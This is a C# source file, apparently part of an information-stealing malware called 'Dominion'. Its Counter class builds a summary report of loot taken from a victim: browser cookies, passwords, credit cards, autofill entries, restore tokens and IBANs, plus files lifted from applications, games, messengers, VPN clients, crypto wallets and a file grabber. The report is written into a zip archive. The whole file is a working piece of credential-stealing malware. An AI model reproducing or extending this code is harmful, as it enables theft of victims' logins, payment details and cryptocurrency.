using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;

namespace dominion.src.dominion.Dependencies.Data
{
    public class Counter
    {
        public void Collect(InMemoryZip zip)
        {
            List<string> list = new List<string>();
            list.Add("    ____      __       _______  __");
            list.Add("   /  _/___  / /____  / /  _/ |/ /");
            list.Add("   / // __ \\/ __/ _ \\/ // / |   / ");
            list.Add(" _/ // / / / /_/  __/ // / /   |  ");
            list.Add("/___/_/ /_/\\__/\\___/_/___//_/|_|  ");
            list.Add("                                   ");
            list.Add("");

            if (this.Browsers.Count() > 0)
            {
                list.Add(string.Format("[Browsers]  [--{0}--]  [{1}]", this.Browsers.Count(), string.Join(", ", (from b in this.Browsers select b.BrowserName).ToArray())));
                foreach (Counter.CounterBrowser counterBrowser in this.Browsers)
                {
                    list.Add("  - " + counterBrowser.Profile);
                    if (counterBrowser.Cookies != 0L)
                    {
                        list.Add(string.Format("       [Cookies {0}]", counterBrowser.Cookies));
                    }
                    if (counterBrowser.Password != 0L)
                    {
                        list.Add(string.Format("       [Passwords {0}]", counterBrowser.Password));
                    }
                    if (counterBrowser.CreditCards != 0L)
                    {
                        list.Add(string.Format("       [CreditCards {0}]", counterBrowser.CreditCards));
                    }
                    if (counterBrowser.AutoFill != 0L)
                    {
                        list.Add(string.Format("       [AutoFill {0}]", counterBrowser.AutoFill));
                    }
                    if (counterBrowser.RestoreToken != 0L)
                    {
                        list.Add(string.Format("       [RestoreToken {0}]", counterBrowser.RestoreToken));
                    }
                    if (counterBrowser.MaskCreditCard != 0L)
                    {
                        list.Add(string.Format("       [MaskCreditCard {0}]", counterBrowser.MaskCreditCard));
                    }
                    if (counterBrowser.MaskedIban != 0L)
                    {
                        list.Add(string.Format("       [MaskedIban {0}]", counterBrowser.MaskedIban));
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (this.Applications.Count() > 0)
            {
                list.Add(string.Format("[Applications]  [--{0}--]  [{1}]", this.Applications.Count(), string.Join(", ", (from b in this.Applications select b.Name).ToArray())));
                foreach (Counter.CounterApplications counterApplications in this.Applications)
                {
                    list.Add("     [Name " + counterApplications.Name + "]");
                    foreach (string str in counterApplications.Files.Reverse())
                    {
                        list.Add("       - " + str);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (this.Games.Count() > 0)
            {
                list.Add(string.Format("[Games]  [--{0}--]  [{1}]", this.Games.Count(), string.Join(", ", (from b in this.Games select b.Name).ToArray())));
                foreach (Counter.CounterApplications counterApplications2 in this.Games)
                {
                    list.Add("     [Name " + counterApplications2.Name + "]");
                    foreach (string str2 in counterApplications2.Files.Reverse())
                    {
                        list.Add("       - " + str2);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (this.Messangers.Count() > 0)
            {
                list.Add(string.Format("[Messangers]  [--{0}--]  [{1}]", this.Messangers.Count(), string.Join(", ", (from b in this.Messangers select b.Name).ToArray())));
                foreach (Counter.CounterApplications counterApplications3 in this.Messangers)
                {
                    list.Add("     [Name " + counterApplications3.Name + "]");
                    foreach (string str3 in counterApplications3.Files.Reverse())
                    {
                        list.Add("       - " + str3);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (this.Vpns.Count() > 0)
            {
                list.Add(string.Format("[Vpns]  [--{0}--]  [{1}]", this.Vpns.Count(), string.Join(", ", (from b in this.Vpns select b.Name).ToArray())));
                foreach (Counter.CounterApplications counterApplications4 in this.Vpns)
                {
                    list.Add("     [Name " + counterApplications4.Name + "]");
                    foreach (string str4 in counterApplications4.Files.Reverse())
                    {
                        list.Add("       - " + str4);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (this.CryptoChromium.Count() > 0)
            {
                list.Add(string.Format("[CryptoChromium]  [--{0}--]", this.CryptoChromium.Count()));
                foreach (string str5 in this.CryptoChromium)
                {
                    list.Add("  - " + str5);
                }
                list.Add("");
            }

            if (this.CryptoDesktop.Count() > 0)
            {
                list.Add(string.Format("[CryptoDesktop]  [--{0}--]", this.CryptoDesktop.Count()));
                foreach (string str6 in this.CryptoDesktop)
                {
                    list.Add("  - " + str6);
                }
                list.Add("");
            }

            if (this.FilesGrabber.Count() > 0)
            {
                list.Add(string.Format("[FilesGrabber]  [--{0}--]", this.FilesGrabber.Count()));
                foreach (string str7 in this.FilesGrabber)
                {
                    list.Add("  - " + str7);
                }
                list.Add("");
            }

            zip.AddTextFile("Dominion.txt", string.Join("\n", list));
        }

        public ConcurrentBag<string> FilesGrabber = new ConcurrentBag<string>();
        public ConcurrentBag<string> CryptoDesktop = new ConcurrentBag<string>();
        public ConcurrentBag<string> CryptoChromium = new ConcurrentBag<string>();
        public ConcurrentBag<Counter.CounterBrowser> Browsers = new ConcurrentBag<Counter.CounterBrowser>();
        public ConcurrentBag<Counter.CounterApplications> Applications = new ConcurrentBag<Counter.CounterApplications>();
        public ConcurrentBag<Counter.CounterApplications> Vpns = new ConcurrentBag<Counter.CounterApplications>();
        public ConcurrentBag<Counter.CounterApplications> Games = new ConcurrentBag<Counter.CounterApplications>();
        public ConcurrentBag<Counter.CounterApplications> Messangers = new ConcurrentBag<Counter.CounterApplications>();

        public class CounterBrowser
        {
            public string Profile;
            public string BrowserName;
            public long Cookies;
            public long Password;
            public long CreditCards;
            public long AutoFill;
            public long RestoreToken;
            public long MaskCreditCard;
            public long MaskedIban;
        }

        public class CounterApplications
        {
            public string Name;
            public ConcurrentBag<string> Files = new ConcurrentBag<string>();
        }
    }
}